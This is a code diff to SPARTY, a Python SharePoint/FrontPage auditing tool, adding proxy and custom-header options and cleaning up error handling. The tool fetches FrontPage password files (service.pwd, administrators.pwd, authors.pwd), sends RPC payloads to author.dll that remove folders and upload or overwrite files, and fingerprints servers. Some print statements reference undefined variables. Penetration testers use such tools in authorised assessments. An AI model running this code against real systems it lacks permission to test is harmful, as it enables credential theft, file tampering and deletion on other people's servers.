@@ -1,10 +1,10 @@
-import os, sys
-import argparse
+import sys
 import re
 import requests
 import colorama
 from urllib3.exceptions import InsecureRequestWarning
 
+# Disable warnings
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 colorama.init()
@@ -86,19 +86,23 @@ RED = colorama.Fore.RED
 BLUE = colorama.Fore.BLUE
 CYAN = colorama.Fore.CYAN
 
+# Custom headers
+custom_headers = {}
+# Proxy
+custom_proxy = {}
 
 def banner():
     ascii_banner = rf"""{RED}
 
-	
+
 	 ____  ____   _    ____ _______   __  ____         ___
 	/ ___||  _ \ / \  |  _ \_   _\ \ / / |___ \       / _ \
 	\___ \| |_) / _ \ | |_) || |  \ V /    __) |     | | | |
 	 ___) |  __/ ___ \|  _ < | |   | |    / __/   _  | |_| |
 	|____/|_| /_/   \_\_| \_\|_|   |_|   |_____| (_)  \___/
 
-	
-    
+
+
 	"""
 
     print(ascii_banner)
@@ -111,9 +115,9 @@ banner()
 
 def sparty_usage(destination):
     print("[scanning access permissions in forms directory - sharepoint] %s -s forms -u  %s " % (
-    sys.argv[0], destination))
+        sys.argv[0], destination))
     print("[scanning access permissions in frontpage directory - frontpage] %s -f pvt -u %s " % (
-    sys.argv[0], destination))
+        sys.argv[0], destination))
     print("[dumping passwords] %s -d dump -u %s " % (sys.argv[0], destination))
     print("[note] : please take this into consideration!")
     print("\t\t: (1) always specify https | http explcitly !")
@@ -126,7 +130,8 @@ def target_information(name):
     print(f"{GREEN} [*] TARGET INFORMATION {RESET}")
     print("")
     try:
-        headers = requests.get(name, verify=False)
+        global custom_headers
+        headers = requests.get(name, verify=False, headers=custom_headers, proxies=custom_proxy)
         print("[+] Fetching information from the given target --> [%s]" % (headers.url))
         print("[+] Target responded with HTTP code --> [%s]" % headers.status_code)
         print("[+] Target is running server --> [%s]" % headers.headers['server'])
@@ -145,32 +150,30 @@ def build_target(target, front_dirs=[], refine_target=[]):
 
 
 def audit(target=[]):
+    global custom_headers
     print("")
     for element in target:
         try:
-            handle = requests.get(element, verify=False)
-            info = handle.headers
+            handle = requests.get(element, verify=False, headers=custom_headers, proxies=custom_proxy)
             response_code = handle.status_code
             print("[+] (%s) - (%d)" % (element, response_code))
-
 
         except requests.exceptions.HTTPError:
             print("[-] (%s) - (%d)" % (element))
 
-
         except KeyboardInterrupt:
             print(f"{RED} Keyboard Interrupt Detected {RESET}")
             sys.exit(0)
-
-        except:
-            print(f"{RED}[-] Server responds with bad status {RESET}")
-            print("")
+        except Exception as e:
+            print(f"{RED}[-] Server responds with bad status {e} {RESET}")
             pass
     print("")
 
 
 def dump_credentials(dest):
     print("")
+    global custom_headers
+    global custom_proxy
     pwd_targets = []
     pwd_files = ['_vti_pvt/service.pwd', '_vti_pvt/administrators.pwd', '_vti_pvt/authors.pwd']
     filename = "__dump__.txt"
@@ -179,7 +182,7 @@ def dump_credentials(dest):
 
     for entry in pwd_targets:
         try:
-            handle = requests.get(entry, verify=False)
+            handle = requests.get(entry, verify=False, headers=custom_headers, proxies=custom_proxy)
             if handle.status_code == 200:
                 print("[+] Dumping contents of file located at : (%s)" % (entry))
                 filename = "__dump__.txt"
@@ -201,14 +204,14 @@ def dump_credentials(dest):
 
         except:
             print(f"{RED}[-] Server responds with bad status {RESET}")
-
             pass
-
     print("")
 
 
 def fingerprint_frontpage(name):
     print("")
+    global custom_headers
+    global custom_proxy
     enum_nix = ['_vti_bin/_vti_aut/author.exe', '_vti_bin/_vti_adm/admin.exe', '_vti_bin/shtml.exe']
     enum_win = ['_vti_bin/_vti_aut/author.dll', '_vti_bin/_vti_aut/dvwssr.dll', '_vti_bin/_vti_adm/admin.dll',
                 '_vti_bin/shtml.dll']
@@ -220,7 +223,7 @@ def fingerprint_frontpage(name):
 
     for entry in build_enum_nix:
         try:
-            info = requests.get(entry, verify=False)
+            info = requests.get(entry, verify=False, headers=custom_headers, proxies=custom_proxy)
             if info.status_code == 200:
                 print("[+] Front page is tested as : nix version |  (%s) | (%d)" % (entry, info.status_code))
                 print("")
@@ -233,7 +236,7 @@ def fingerprint_frontpage(name):
 
     for entry in build_enum_win:
         try:
-            info = requests.get(entry, verify=False)
+            info = requests.get(entry, verify=False, headers=custom_headers, proxies=custom_proxy)
             if info.status_code == 200:
                 print("[+] Front page is tested as : windows version |  (%s) | (%d)" % (entry, info.status_code))
                 print("")
@@ -243,7 +246,7 @@ def fingerprint_frontpage(name):
 
     frontend_version = name + "/_vti_inf.html"
     try:
-        version = requests.get(frontend_version, verify=False)
+        version = requests.get(frontend_version, verify=False, headers=custom_headers, proxies=custom_proxy)
         version_content = version.content.decode('utf-8')
         print("[+] Extracting frontpage version from default file : (%s):" % re.findall(r'FPVersion=(.*)',
                                                                                         version_content))
@@ -251,8 +254,6 @@ def fingerprint_frontpage(name):
     except requests.exceptions.HTTPError:
         print("[-] Failed to extract the version of frontpage from default file!")
         pass
-
-
 
     except KeyboardInterrupt:
         print(f"{RED} Keyboard Interrupt Detected {RESET}")
@@ -262,45 +263,36 @@ def fingerprint_frontpage(name):
         print(f"{RED}[-] Server responds with bad status {RESET}")
         print("")
         pass
-
     print("")
 
 
 def dump_sharepoint_headers(name):
     print("")
+    global custom_headers
+    global custom_proxy
     try:
-        dump_s = requests.get(name, verify=False)
+        dump_s = requests.get(name, verify=False, headers=custom_headers, proxies=custom_proxy)
         print("[+] Configured sharepoint version is  : (%s)" % dump_s.headers['microsoftsharepointteamservices'])
-
     except KeyError:
         print("[-] Sharepoint version could not be extracted using HTTP header :  MicrosoftSharepointTeamServices ")
-
     try:
-        dump_f = requests.get(name, verify=False)
+        dump_f = requests.get(name, verify=False, headers=custom_headers, proxies=custom_proxy)
         print("[+] Sharepoint is configured with load balancing capability : (%s)" % dump_f.headers[
             'x-sharepointhealthscore'])
-
     except KeyError:
         print(
             "[-] Sharepoint load balancing ability could not be determined using HTTP header : X-SharepointHealthScore ")
-
     try:
-        dump_g = requests.get(name, verify=False)
+        dump_g = requests.get(name, verify=False, headers=custom_headers, proxies=custom_proxy)
         print("[+] Sharepoint is configured with explicit diagnosis (GUID based log analysis) purposes : (%s)" %
-              dump_f.headers['sprequestguid'])
-
+              dump_g.headers['sprequestguid'])
     except KeyError:
         print("[-] Sharepoint diagnostics ability could not be determined using HTTP header : SPRequestGuid ")
-
     except requests.exceptions.HTTPError:
         pass
-
-
-
     except KeyboardInterrupt:
         print(f"{RED} Keyboard Interrupt Detected {RESET}")
         sys.exit(0)
-
     except:
         print("[-] Server responds with bad status ")
         pass
@@ -308,12 +300,18 @@ def dump_sharepoint_headers(name):
 
 def frontpage_rpc_check(name):
     print("")
-    headers = {
+    global custom_proxy
+    global custom_headers
+    local_headers = {
         'MIME-Version': '4.0',
         'User-Agent': 'MSFrontPage/4.0',
         'Content-Type': 'application/json',
         'Accept': 'application/json',
-        'Connection': 'Keep-Alive'}
+        'Connection': 'Keep-Alive'
+    }
+    # Update with user provided headers
+    local_headers.update(custom_headers)
+
     exp_target_list = ['_vti_bin/shtml.exe/_vti_rpc', '_vti_bin/shtml.dll/_vti_rpc']
     data = ["method=server version"]
 
@@ -322,36 +320,24 @@ def frontpage_rpc_check(name):
 
     print("[+] Sending HTTP GET request to - (%s) for verifying whether RPC is listening " % destination)
     try:
-
-        response = requests.get(destination, verify=False)
+        response = requests.get(destination, verify=False, headers=local_headers, proxies=custom_proxy)
         if response.status_code == 200:
             print("[+] Target is listening on frontpage RPC - (%s)" % response.status_code)
         else:
             print("[-] Target is not listening on frontpage RPC - (%s)" % response.status_code)
-
-
-
     except requests.exceptions.ConnectionError:
         print("[-] URL error ")
         pass
-
-
-
     except KeyboardInterrupt:
         print(f"{RED} Keyboard Interrupt Detected {RESET}")
         sys.exit(0)
-
-
     except:
         print(f"{RED}[-] Server responds with bad status {RESET}")
         pass
-
     print("")
-
     print("[+] Sending HTTP POST request to retrieve software version - (%s)" % destination)
     try:
-
-        response = requests.post(destination, json=data, headers=headers, verify=False)
+        response = requests.post(destination, json=data, headers=local_headers, verify=False, proxies=custom_proxy)
         if response.status_code == 200:
             print("[+] Target accepts the request - (%s) | (%s) !\n" % (response.status_code))
             filename = "__version__.txt" + ".html"
@@ -363,16 +349,13 @@ def frontpage_rpc_check(name):
             print("[-] Target fails to accept request - (%s)" % (response.status_code))
 
         print("")
-
     except requests.exceptions.ConnectionError as e:
         print(
             "[-] Url error, seems like authentication is required or server failed to handle request - - %s" % e.status_code)
         pass
-
     except KeyboardInterrupt:
         print(f"{RED} Keyboard Interrupt Detected {RESET}")
         sys.exit(0)
-
     except:
         print(f"{RED}[-] Server responds with bad status {RESET}")
         pass
@@ -380,12 +363,19 @@ def frontpage_rpc_check(name):
 
 def frontpage_service_listing(name):
     print("")
-    headers = {
+    global custom_proxy
+    global custom_headers
+    local_headers = {
         'MIME-Version': '4.0',
         'User-Agent': 'MSFrontPage/4.0',
         'Content-Type': 'application/json',
         'Accept': 'application/json',
-        'Connection': 'Keep-Alive'}
+        'Connection': 'Keep-Alive'
+    }
+
+    # Update with user provided headers
+    local_headers.update(custom_headers)
+
     i = 0
     service_target_list = ['_vti_bin/shtml.exe/_vti_rpc', '_vti_bin/shtml.dll/_vti_rpc']
     data = ['method=list+services:3.0.2.1076&service_name=', 'method=list+services:4.0.2.471&service_name=',
@@ -400,7 +390,7 @@ def frontpage_service_listing(name):
 
         for entry in data:
 
-            response = requests.post(destination, json=data, headers=headers, verify=False)
+            response = requests.post(destination, json=data, headers=local_headers, verify=False, proxies=custom_proxy)
             if response.status_code == 200:
                 print("[+] Target Accepts the request - (%s)" % (entry.split('&')[0], response.status_code))
                 i += 1
@@ -417,11 +407,9 @@ def frontpage_service_listing(name):
     except requests.exceptions.ConnectionError:
         print("[-] Url error, seems like authentication is required or server failed to handle request ")
         pass
-
     except KeyboardInterrupt:
         print(f"{RED} Keyboard Interrupt Detected {RESET}")
         sys.exit(0)
-
     except:
         print(f"{RED}[-] Server responds with bad status {RESET}")
         pass
@@ -429,12 +417,18 @@ def frontpage_service_listing(name):
 
 def frontpage_config_check(name):
     print("")
-    headers = {
+    global custom_proxy
+    global custom_headers
+    local_headers = {
         'MIME-Version': '4.0',
         'User-Agent': 'MSFrontPage/4.0',
         'Content-Type': 'application/json',
         'Accept': 'application/json',
-        'Connection': 'Keep-Alive'}
+        'Connection': 'Keep-Alive'
+    }
+
+    # Update with user provided headers
+    local_headers.update(custom_headers)
 
     front_exp_target = '_vti_bin/_vti_aut/author.dll'
     payloads = ['method=open service:3.0.2.1706&service_name=/',
@@ -457,10 +451,8 @@ def frontpage_config_check(name):
     print("[+] Sending HTTP POST request to [open service | listing documents] - (%s)" % destination)
     print("")
     for item in payloads:
-
         try:
-
-            response = requests.post(destination, json=item, headers=headers, verify=False)
+            response = requests.post(destination, json=item, headers=local_headers, verify=False, proxies=custom_proxy)
             if response.status_code == 200:
                 print("[+] target accepts the request -  [%s] | (%s)" % (item.split('&')[0], response.status_code))
                 filename = "__author-dll-config__" + ".html"
@@ -468,23 +460,17 @@ def frontpage_config_check(name):
                 response_content = response.content.decode('utf-8')
                 service_list.write(response_content)
                 print("[+] Check file for contents - (%s)" % filename)
-
             else:
                 print("[-] Target Fails to accept request - | [%s] | (%s)" % (item.split('&')[0], response.status_code))
-
-
-
 
         except requests.exceptions.ConnectionError:
             print(
                 "[-] Url error, seems like authentication is required or server failed to handle request! - (%s) \n" % (
                     item))
             pass
-
         except KeyboardInterrupt:
             print(f"{RED} Keyboard Interrupt Detected {RESET}")
             sys.exit(0)
-
         except:
             print(f"{RED}[-] Server responds with bad status {RESET}")
             pass
@@ -493,12 +479,18 @@ def frontpage_config_check(name):
 
 def frontpage_remove_folder(name):
     print("")
-    headers = {
+    global custom_proxy
+    global custom_headers
+    local_headers = {
         'MIME-Version': '4.0',
         'User-Agent': 'MSFrontPage/4.0',
         'Content-Type': 'application/json',
         'Accept': 'application/json',
-        'Connection': 'Keep-Alive'}
+        'Connection': 'Keep-Alive'
+    }
+
+    # Update with user provided headers
+    local_headers.update(custom_headers)
 
     file_exp_target = '_vti_bin/_vti_aut/author.dll'
     payloads = ['method=remove+documents:3.0.2.1786&service_name=/',
@@ -513,7 +505,7 @@ def frontpage_remove_folder(name):
 
         try:
 
-            response = requests.post(destination, json=item, headers=headers, verify=False)
+            response = requests.post(destination, json=item, headers=local_headers, verify=False, proxies=custom_proxy)
             if response.status_code == 200:
                 print("[+] Folder removed successfully - [%s] | (%s)  " % (item.split('&')[0], response.status_code))
 
@@ -529,22 +521,26 @@ def frontpage_remove_folder(name):
         except KeyboardInterrupt:
             print(f"{RED} Keyboard Interrupt Detected {RESET}")
             sys.exit(0)
-
         except:
             print(f"{RED}[-] Server responds with bad status {RESET}")
             pass
-
     print("")
 
 
 def file_upload_check(name):
     print("")
-    headers = {
+    global custom_proxy
+    global custom_headers
+    local_headers = {
         'MIME-Version': '4.0',
         'User-Agent': 'MSFrontPage/4.0',
         'Content-Type': 'application/json',
         'Accept': 'application/json',
-        'Connection': 'Keep-Alive'}
+        'Connection': 'Keep-Alive'
+    }
+
+    # Update with user provided headers
+    local_headers.update(custom_headers)
 
     file_exp_target = '_vti_bin/_vti_aut/author.dll'
     payloads = [
@@ -554,53 +550,57 @@ def file_upload_check(name):
         'method=put document:5.0.2.2623&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
         'method=put document:5.0.2.4823&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
         'method=put document:6.0.2.5420&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false']
-
     destination = name + "/" + file_exp_target
     print("[+] Sending HTTP POST request for uploading file to - (%s)" % destination)
     print("")
     for item in payloads:
-
         try:
-
-            response = requests.post(destination, json=item, headers=headers, verify=False)
+            response = requests.post(destination, json=item, headers=local_headers, verify=False, proxies=custom_proxy)
             if response.status_code == 200:
+                # TODO: fix items splitting
                 print("[+] File uploaded successfully - [%s] | (%s) \n" % (items.split('&')[0], response.status_code))
                 print("Check Uploaded File at - (%s)" % (destination + "sparty.txt"))
-
-
             else:
-                print("[-] File Fails to upload  - [%s] | (%s)" % (entry.split('&')[0], response.status_code))
-
+                print("[-] File Fails to upload  - [%s] | (%s)" % (items.split('&')[0], response.status_code))
 
         except requests.exceptions.ConnectionError:
             print(
                 "[-] Url error, seems like authentication is required or server failed to handle request! - (%s) \n" % (
                     item))
             pass
-
-
         except KeyboardInterrupt:
             print(f"{RED} Keyboard Interrupt Detected {RESET}")
             sys.exit(0)
-
-
         except:
             print(f"{RED}[-] Server responds with bad status {RESET}")
             pass
-
     print("")
 
 
 def main():
     try:
         import argparse
+        global custom_headers
+        global custom_proxy
         parser = argparse.ArgumentParser(description="SPARTY : Sharepoint/Frontpage Security Auditing Tool")
-
         parser.add_argument("-u", "--url", help="Target URL", required=True)
         parser.add_argument('-enum', '--enumeration', action='store_true')
         parser.add_argument('-exploit', '--exploitation', action='store_true')
+        parser.add_argument('-p', '--proxy', help="Specify proxy as http://user:password@host:port")
+        parser.add_argument('-hds', '--headers', nargs='+', help="Specify headers as key=value pairs")
 
         args = parser.parse_args()
+        if args.headers:
+            for header in args.headers:
+                try:
+                    key, value = header.split('=', 1)
+                    custom_headers[key] = value
+                except ValueError:
+                    print(f"Error: Incorrect header format '{header}'. Expected format 'key=value'.")
+                    sys.exit(1)
+
+        custom_proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else None
+
         target = args.url
         target_information(target)
         if args.enumeration:
@@ -661,7 +661,6 @@ def main():
 
 
 if __name__ == '__main__':
-
     try:
         main()
     except KeyboardInterrupt:
